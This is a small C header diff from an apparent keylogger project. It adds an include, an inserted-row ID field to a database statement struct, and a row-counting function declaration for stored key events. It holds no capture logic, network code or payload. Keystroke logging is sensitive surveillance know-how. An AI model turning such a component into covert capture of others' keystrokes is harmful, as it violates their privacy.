@@ -20,6 +20,7 @@
 #include <sys/time.h>
 //////////////////////////////////////
 #include "../keylogger/keylogger.h"
+#include "bytes/bytes.h"
 #include "int/int.h"
 #include "keylogger-db/keylogger-db.h"
 #include "submodules/b64.c/b64.h"
@@ -39,6 +40,7 @@ typedef struct DB_STATEMENT_T {
   enum sqldbal_status_code rc;
   struct sqldbal_stmt      *stmt;
   int64_t                  qty;
+  int64_t                  inserted_id;
 } db_statement_t;
 typedef struct logged_key_event_t {
   unsigned long ts, qty;
@@ -59,3 +61,4 @@ int keylogger_select_db(void);
 int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT);
 int keylogger_close_db(void);
 int keylogger_db_lifecycle(void);
+size_t keylogger_count_table_rows(const char *TABLE_NAME);
